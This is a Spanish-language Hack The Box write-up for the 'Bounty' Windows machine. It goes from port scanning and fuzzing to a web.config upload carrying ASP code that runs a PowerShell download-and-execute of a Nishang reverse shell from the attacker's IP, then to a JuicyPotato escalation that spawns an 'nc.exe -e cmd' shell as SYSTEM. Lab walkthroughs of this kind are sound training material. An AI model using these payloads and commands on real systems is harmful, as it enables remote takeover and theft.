---
layout: single
title: Bounty - Hack The Box
excerpt: "Esta es una máquina algo sencilla, vamos a usar Fuzzing a la página web que está activa en puerto HTTP, como no descubrimos nada, buscaremos por archivos ASP, pues usa este servicio y encontraremos una subpágina para subir archivos. Utilizaremos BurpSuite para descubrir que archivos acepta, que en este caso serán los .config, usaremos un archivo web.config para cargar un Payload de Nishang .ps1, con esto accederemos a la máquina como usuarios. Para escalar privilegios, usaremos Juicy Potato, pues tiene este privilegio activo."
date: 2023-04-24
classes: wide
header:
  teaser: /assets/images/htb-writeup-bounty/bounty_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Windows
  - IIS 7.5
  - Fuzzing
  - BurpSuite
  - Sniper Attack
  - web.config Exploit
  - ASP Payload
  - Nishang
  - Juicy Potato
  - OSCP Style
---
![](/assets/images/htb-writeup-bounty/bounty_logo.png)
Esta es una máquina algo sencilla, vamos a usar **Fuzzing** a la página web que está activa en puerto **HTTP**, como no descubrimos nada, buscaremos por archivos **ASP**, pues usa este servicio y encontraremos una subpágina para subir archivos. Utilizaremos **BurpSuite** para descubrir que archivos acepta, que en este caso serán los **.config**, usaremos un archivo **web.config** para cargar un Payload de **Nishang .ps1**, con esto accederemos a la máquina como usuarios. Para escalar privilegios, usaremos **Juicy Potato**, pues tiene este privilegio activo. 

<br>
<hr>
<div id="Indice">
	<h1>Indice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#P80">Analizando Puerto 80</a></li>
				<li><a href="#Fuzz">Fuzzing</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Attack">Ataque Sniper con BurpSuite</a></li>
				<li><a href="#Exploit">Buscando un Exploit</a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#Juicy">Usando el Juicy Potato</a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:75%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:3px;5px;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>
Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```
ping -c 4 10.10.10.93
PING 10.10.10.93 (10.10.10.93) 56(84) bytes of data.
64 bytes from 10.10.10.93: icmp_seq=1 ttl=127 time=131 ms
64 bytes from 10.10.10.93: icmp_seq=2 ttl=127 time=131 ms
64 bytes from 10.10.10.93: icmp_seq=3 ttl=127 time=131 ms
64 bytes from 10.10.10.93: icmp_seq=4 ttl=127 time=132 ms

--- 10.10.10.93 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3008ms
rtt min/avg/max/mdev = 130.590/131.044/131.829/0.481 ms
```
Por el TTL sabemos que la máquina usa Windows, hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.93 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 14:51 CST
Initiating SYN Stealth Scan at 14:51
Scanning 10.10.10.93 [65535 ports]
Discovered open port 80/tcp on 10.10.10.93
Increasing send delay for 10.10.10.93 from 0 to 5 due to 11 out of 18 dropped probes since last increase.
Completed SYN Stealth Scan at 14:52, 29.73s elapsed (65535 total ports)
Nmap scan report for 10.10.10.93
Host is up, received user-set (0.76s latency).
Scanned at 2023-04-24 14:51:40 CST for 30s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 29.81 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 22 (956B)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Solo veo un puerto abierto, hagamos el escaneo de servicios.

<h2 id="Servicios">Escaneo de Servicios</h2>
```
nmap -sC -sV -p80 10.10.10.93 -oN targeted                            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 14:53 CST
Nmap scan report for 10.10.10.93
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.03 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Veo el servicio **IIS** que ya hemos hackeado en otras máquinas. Analicemos el puerto 80.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:75%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:3px;5px;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="P80">Analizando Puerto 80</h2>
Bien, entremos.

![](/assets/images/htb-writeup-bounty/Captura1.png)

Solamente hay una imagen, veamos que nos dice **Wappalizer**.

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura2.png">
</p>

Ok, ya sabemos que nos enfrentamos al servicio **IIS**, hagamos **Fuzzing** para ver que nos podemos encontrar.

<h2 id="Fuzz">Fuzzing</h2>
```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.93/FUZZ.php/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.93/FUZZ.php/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000001:   200        31 L     53 W       630 Ch      "# directory-list-2.3-medium.txt"                                     
000000003:   200        31 L     53 W       630 Ch      "# Copyright 2007 James Fisher"                                       
000000007:   200        31 L     53 W       630 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"     
000000013:   200        31 L     53 W       630 Ch      "#"                                                                   
000000012:   200        31 L     53 W       630 Ch      "# on atleast 2 different hosts"                                      
000000011:   200        31 L     53 W       630 Ch      "# Priority ordered case sensative list, where entries were found"    
000000010:   200        31 L     53 W       630 Ch      "#"                                                                   
000000009:   200        31 L     53 W       630 Ch      "# Suite 300, San Francisco, California, 94105, USA."                 
000000006:   200        31 L     53 W       630 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"       
000000008:   200        31 L     53 W       630 Ch      "# or send a letter to Creative Commons, 171 Second Street,"          
000000002:   200        31 L     53 W       630 Ch      "#"                                                                   
000000005:   200        31 L     53 W       630 Ch      "# This work is licensed under the Creative Commons"                  
000000004:   200        31 L     53 W       630 Ch      "#"                                                                   

Total time: 753.8032
Processed Requests: 220560
Filtered Requests: 220547
Requests/sec.: 292.5962
```
* -c: Para que se muestren los resultados con colores.
* --hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster

Mmmmmm no encontró nada, lo que podemos hacer es buscar archivos tipo **ASP** o **ASPX** porque, si recordamos, gracias al **Wappalizer** sabemos que la página web, usa **ASP.NET**.

```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,asp-aspx http://10.10.10.93/FUZZ.FUZ2Z 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.93/FUZZ.FUZ2Z
Total requests: 441120

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000001:   200        31 L     53 W       630 Ch      "# directory-list-2.3-medium.txt - asp"                               
000000003:   200        31 L     53 W       630 Ch      "# - asp"                                                             
000000007:   200        31 L     53 W       630 Ch      "# - asp"                                                             
000000015:   200        31 L     53 W       630 Ch      "# or send a letter to Creative Commons, 171 Second Street, - asp"    
000000026:   200        31 L     53 W       630 Ch      "# - aspx"                                                            
000000025:   200        31 L     53 W       630 Ch      "# - asp"                                                             
000000013:   200        31 L     53 W       630 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/ - asp
                                                        "                                                                     
000000018:   200        31 L     53 W       630 Ch      "# Suite 300, San Francisco, California, 94105, USA. - aspx"          
000000023:   200        31 L     53 W       630 Ch      "# on atleast 2 different hosts - asp"                                
000000011:   200        31 L     53 W       630 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this - asp" 
000000010:   200        31 L     53 W       630 Ch      "# This work is licensed under the Creative Commons - aspx"           
000000016:   200        31 L     53 W       630 Ch      "# or send a letter to Creative Commons, 171 Second Street, - aspx"   
000000012:   200        31 L     53 W       630 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this - aspx"
000000014:   200        31 L     53 W       630 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/ - asp
                                                        x"                                                                    
000000017:   200        31 L     53 W       630 Ch      "# Suite 300, San Francisco, California, 94105, USA. - asp"           
000000021:   200        31 L     53 W       630 Ch      "# Priority ordered case sensative list, where entries were found - as
                                                        p"                                                                    
000000020:   200        31 L     53 W       630 Ch      "# - aspx"                                                            
000000022:   200        31 L     53 W       630 Ch      "# Priority ordered case sensative list, where entries were found - as
                                                        px"                                                                   
000000019:   200        31 L     53 W       630 Ch      "# - asp"                                                             
000000024:   200        31 L     53 W       630 Ch      "# on atleast 2 different hosts - aspx"                               
000000009:   200        31 L     53 W       630 Ch      "# This work is licensed under the Creative Commons - asp"            
000000008:   200        31 L     53 W       630 Ch      "# - aspx"                                                            
000000002:   200        31 L     53 W       630 Ch      "# directory-list-2.3-medium.txt - aspx"                              
000000004:   200        31 L     53 W       630 Ch      "# - aspx"                                                            
000000006:   200        31 L     53 W       630 Ch      "# Copyright 2007 James Fisher - aspx"                                
000000005:   200        31 L     53 W       630 Ch      "# Copyright 2007 James Fisher - asp"                                 
000007566:   200        21 L     58 W       941 Ch      "transfer - aspx"                                                     
000014008:   400        0 L      2 W        11 Ch       "*checkout* - aspx"                                                   
000030926:   400        0 L      2 W        11 Ch       "*docroot* - aspx"                                                    
000032826:   400        0 L      2 W        11 Ch       "* - aspx"                                                            
000045942:   400        0 L      2 W        11 Ch       "http%3A%2F%2Fwww - aspx"
...
```
* -c: Para que se muestren los resultados con colores.
* --hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster
* -z: Especifica un payload para cada palabra clave del FUZZ usado en forma de nombre: parametro, encoder.
* list,asp-aspx: Para listar los archivos tipo **ASP** y **ASPX**

Encontramos uno, vamos a ver de que se trata:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura3.png">
</p>

Podemos subir un archivo, el problema es que no sabemos qué tipo de archivo acepta, así que tenemos dos opciones:
* Probar con varios tipos para ver cuál acepta.
* Usar **BurpSuite**

Vamos a probar con **BurpSuite**.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:75%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:3px;5px;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Attack">Ataque Sniper con BurpSuite</h2>
Lo que haremos, será capturar la subida de archivos del **aspx**. Abre **BurpSuite** y ponlo en modo de captura, lo que haré será intentar subir una **Reverse Shell** de **PHP** para ver si lo acepta y aunque no lo haga, ya abre capturado la petición.

**IMPORTANTE**

Este ataque es tardado, así que ten paciencia. Sigamos:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura4.png">
</p>

Y vemos lo que se capturó:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura5.png">
</p>

Debemos presionar **ctrl + i** para mandar la petición al **Intruder**. Nos vamos al **Intruder** y ya debería estar ahí:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura6.png">
</p> 

Podemos escoger el tipo de ataque que queremos y ahí veremos el **ataque Sniper**:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura7.png">
</p>

Bien, lo que debemos hacer es limpiar la petición para poder cargar la extensión **.php** en el payload del ataque, para eso solamente le damos click al botón **clear** que está del lado derecho y debería quedar así:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura8.png">
</p>

Seleccionamos la extensión **.php**:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura9.png">
</p>

Y le damos click en el botón **Add** que está arriba de **clear**, nos debería quedar así:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura10.png">
</p>

Ahora vamos a cargar el Payload con las extensiones, para hacerlo, vamos a la sección **Payloads** y le daremos click a **Load** de la sección **Payload settings**:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura11.png">
</p>

De ahí, nos iremos al directorio **Seclists** que está en el directorio **/usr/share**:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura12.png">
</p>

Entramos en el directorio **Discovery** y luego en **Web-Content**, el archivo que buscamos es el llamado **raft-medium-extensions-lowercase.txt**:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura13.png">
</p>

Lo seleccionas, lo abres y ya estarán cargadas las extensiones:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura14.png">
</p>

**OJO**, debemos quitar la opción **Payload encoding** porque como estamos usando extensiones, si no la quitamos, nos va a url encodear los puntos y no servirá el ataque:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura17.png">
</p>

Vamos bien, ahora ve a la sección **Settings** y vamos a la sección **Grep - Extract** para añadir una expresión regular que nos va a mostrar lo que queremos ver:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura15.png">
</p>

Sigue las indicaciones, dale a **Fecth Response** y selecciona el error **Invalid File. Please try again**:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura16.png">
</p>

Y ya está listo el ataque, si nos vamos hasta arriba podemos lanzar el ataque:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura18.png">
</p>

Durante el ataque, veremos el siguiente archivo, este nos puede servir para buscar un Exploit:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura19.png">
</p>

<h2 id="Exploit">Buscando un Exploit</h2>
Mientras buscaba un Exploit usando este:
* https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/

Lo que hace este archivo es una simple operación matemática, sumando 2 + 1, el resultado debería mostrarse cuando se cargue este archivo en la página web.

Vamos a copiar ese archivo y lo llamaremos **web.config**, lo vamos a cargar a la página web para poder verla en la subpágina **uploadFiles**:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura20.png">
</p> 

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura21.png">
</p>

Pero ¿Cómo sabemos en donde se guardó?, vamos a hacer un **Fuzzing**, pero usando un diccionario, qué este enfocado a subpáginas que sean para cargar archivos. Para esto, vamos a hacer un **grep** al **wordlist** que usamos, que en mi caso uso el **dirbuster/directory-list-2.3-medium.txt**:
```
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep -i upload
uploads
upload
WPupload
uploaded_images
uploaded
Upload
Uploads
gal_upload
uploadedImages
user_upload
UploadedFiles
uploadedimages
upload_control
uploadedFiles
_upload
upload_images
torrents-upload
videouploadform
uploaded_files
fileupload
uploads2
FileUploader
NeatUpload
uploadedfiles
auto-uploaded
megaupload
uploading
HTTP_Upload
UploadFiles
file-upload
docUploads
user_uploads
home_upload
viewuploads
validator-upload
lastupload
uploadnets
uploadweb
file_upload
upload_v2
uploader
primeupload
uploaddir
dss_upload
UploadedImages
uploadimages
```
Bien, salen estos resultados, vamos a guardarlos en un archivo **.txt** para usarlo como diccionario:
```
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep -i upload > diccionario.txt
```
Ahora vamos a usar **wfuzz** y usaremos el diccionario que creamos para que solamente busque las subpáginas como "upload":
```
wfuzz -c --hc=404 -t 200 -w $(pwd)/diccionario.txt http://10.10.10.93/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.93/FUZZ/
Total requests: 46

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000014:   403        29 L     92 W       1233 Ch     "uploadedFiles"                                                       
000000024:   403        29 L     92 W       1233 Ch     "uploadedfiles"                                                       
000000011:   403        29 L     92 W       1233 Ch     "UploadedFiles"                                                       

Total time: 0.600349
Processed Requests: 46
Filtered Requests: 43
Requests/sec.: 76.62198
```
Muy bien, nos sacó 3 resultados con código de estado de 403, ósea que existen, pero no tenemos acceso a ellos. Ya sabemos donde se guardó nuestro archivo **web.config**. Aunque no tengamos permiso para ver estas subpáginas, si conocemos el nombre del archivo, podemos acceder sin ningún problema.

Nos vamos a la subpágina **uploadFiles**, ponemos el nombre **web.config** y deberíamos ver un 3, si no se ve, vuelve a subir el archivo y carga la página otra vez:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura22.png">
</p>

Excelente, entonces podemos aprovecharnos de esto para poder acceder a la máquina. Para esto, vamos a cambiar el script del **web.config** para que pueda cargar un Payload y nos pueda conectar a la máquina. El Payload que vamos a ocupar será de **Nishang**, usaremos el **Invoke-PowerShellTcp.ps1**.

Copiamos el archivo en nuestra máquina:
```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
--2023-04-24 21:13:28--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.108.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 4339 (4.2K) [text/plain]
Grabando a: «Invoke-PowerShellTcp.ps1»

Invoke-PowerShellTcp.ps1          100%[============================================================>]   4.24K  --.-KB/s    en 0s      

2023-04-24 21:13:28 (83.7 MB/s) - «Invoke-PowerShellTcp.ps1» guardado [4339/4339]
```
Dentro del **.ps1**, vamos a agregar una línea que nos recomienda el mismo Payload al final:
```
    }
}
 
Invoke-PowerShellTcp -Reverse -IPAddress Tu_IP -Port 443
```

Ahora vamos a cambiar el **web.config**, entrando al siguiente blog, encontraremos un oneliner que nos ayudara a cargar el Payload:
* https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html

El oneliner será el de **ASP**:
```
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
```
Lo copiamos y sustituimos la operación que se hizo en el **web.config**. Así debería quedar:
```
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set co = CreateObject("WScript.Shell")
Set cte = co.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:80/Reverse_Shell.ps1')")
output = cte.StdOut.Readall()
Response.write(output)
%>
-->
```
Adentro del **co.Exec** pondremos el oneliner para cargar el Payload **.ps1**.

Ya tenemos todo listo, lo que sigue es cargar el **web.config** y abriremos un servidor en Python para cargar el Payload, hagamos todo por pasos:
* Abre un servidor en Python en donde tengas el **.ps1**:
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
* Abre una netcat:
```
nc -nvlp 443   
listening on [any] 443 ...
```
* Carga el **web.config** y recarga la página web.

* Y ya deberíamos estar conectados:
```
nc -nvlp 443   
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.93] 49158
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
PS C:\windows\system32\inetsrv>whoami
bounty\merlin
```

Ahora, buscamos la flag del usuario:
```
PS C:\windows\system32\inetsrv> cd C:\
PS C:\> dir
    Directory: C:\


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         5/30/2018   4:14 AM            inetpub                           
d----         7/14/2009   6:20 AM            PerfLogs                          
d-r--         6/10/2018   3:43 PM            Program Files                     
d-r--         7/14/2009   8:06 AM            Program Files (x86)               
d-r--         5/31/2018  12:18 AM            Users                             
d----         5/31/2018  11:37 AM            Windows                           
PS C:\> cd Users
PS C:\Users> dir
    Directory: C:\Users
Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         5/31/2018  12:18 AM            Administrator                     
d----         5/30/2018   4:44 AM            Classic .NET AppPool              
d----         5/30/2018  12:22 AM            merlin                            
d-r--         5/30/2018   5:44 AM            Public                            
PS C:\Users> cd merlin/Desktop
PS C:\Users\merlin\Desktop> dir
```
Ah kbron, no hay nada. Lo que pasa, es que se les ocurrió ocultar la flag, entonces vamos a ver los archivos ocultos:
```
PS C:\Users\merlin\Desktop> dir -Force
    Directory: C:\Users\merlin\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a-hs         5/30/2018  12:22 AM        282 desktop.ini                       
-arh-         4/25/2023  10:17 PM         34 user.txt                          
PS C:\Users\merlin\Desktop> type user.txt
```
Es tiempo de escalar privilegios.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Post" style="text-align:center;">Post Explotación</h1>
  <button style="position:absolute; left:75%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:3px;5px;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


Veamos qué privilegios tenemos:
```
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
Con el **SeImpersonatePrivilege** podemos usar el **Juicy Potato**. Veamos que SO tiene la máquina:
```
PS C:\> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
...
```
Está usando **Microsoft Windows Server 2008 R2 Datacenter**. Ahora, busquemos el **Juicy Potato**.
* https://github.com/ohpe/juicy-potato/releases/tag/v0.1

Descarga él **.exe**, busca una **nc.exe** y cópiala en la misma carpeta que en donde esté el **Juicy Potato**:
```
locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
cp /usr/share/windows-resources/binaries/nc.exe .
```
Para cargar el **Juicy Potato** y la **nc.exe**, vamos a utilizar **certutil.exe** de la máquina víctima y abriendo un servidor de Python. Hagámoslo por pasos:
* Abre el servidor de Python:
```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
* En la máquina víctima, crea un directorio en el directorio **/Temp**:
```
PS C:\> cd Windows/Temp
PS C:\Windows\Temp> mkdir Privesc
    Directory: C:\Windows\Temp
Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         4/25/2023  10:46 PM            Privesc                           
PS C:\Windows\Temp> cd Privesc
PS C:\Windows\Temp\Privesc>
```
* Usa **certutil.exe** para descargar ambos archivos:
```
PS C:\Windows\Temp\Privesc> certutil.exe -urlcache -split -f http://10.10.14.16:8000/JuicyPotato.exe JuicyPotato.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.
PS C:\Windows\Temp\Privesc> dir
    Directory: C:\Windows\Temp\Privesc
Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         4/25/2023  10:48 PM     347648 JuicyPotato.exe                   
PS C:\Windows\Temp\Privesc> certutil.exe -urlcache -split -f http://10.10.14.16:8000/nc.exe nc.exe
****  Online  ****
  0000  ...
  e800
CertUtil: -URLCache command completed successfully.
PS C:\Windows\Temp\Privesc> dir
    Directory: C:\Windows\Temp\Privesc
Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         4/25/2023  10:48 PM     347648 JuicyPotato.exe                   
-a---         4/25/2023  10:48 PM      59392 nc.exe
```
Listo, ahora usemos el **Juicy Potato**.

<h2 id="Juicy">Usando el Juicy Potato</h2>
Para ver la forma de usarlo, usemos el parámetro **-h**:
```
PS C:\Windows\Temp\Privesc> .\JuicyPotato.exe -h
JuicyPotato v0.1 
Mandatory args: 
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port
Optional args: 
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
```
Bien, ahora vamos a mandar una **cmd** como **NT Authority System** a nuestra máquina. Para esto, hagamos lo siguiente:
* Abre una netcat:
```
 nc -nvlp 1337
listening on [any] 1337 ...
```
* Usa el siguiente oneliner usando **JuicyPotato.exe** y la **nc.exe**:
```
PS C:\Windows\Temp\Privesc> .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.16 1337"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```
* Veamos la netcat y ya estaremos conectados:
```
nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.93] 49167
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>whoami
whoami
nt authority\system
```
* Ya solo busca la flag que te falta:
```
C:\Windows\system32>cd ../../Users
cd ../../Users
C:\Users>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 5084-30B0
 Directory of C:\Users
05/31/2018  12:18 AM    <DIR>          .
05/31/2018  12:18 AM    <DIR>          ..
05/31/2018  12:18 AM    <DIR>          Administrator
05/30/2018  04:44 AM    <DIR>          Classic .NET AppPool
05/30/2018  12:22 AM    <DIR>          merlin
05/30/2018  05:44 AM    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)  11,884,220,416 bytes free
C:\Users>cd Administrator/Desktop
cd Administrator/Desktop
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5084-30B0
 Directory of C:\Users\Administrator\Desktop
05/31/2018  12:18 AM    <DIR>          .
05/31/2018  12:18 AM    <DIR>          ..
04/25/2023  10:17 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  11,884,220,416 bytes free
C:\Users\Administrator\Desktop>type root.txt
```
Y con esto ya tendremos la máquina terminada.

Te comparto estos links sobre cómo usar el **Juicy Potato**:
* https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato
* https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:75%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:3px;5px;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>


* https://noticiasseguridad.com/importantes/como-hacer-pruebas-de-penetracion-de-con-wfuzz/
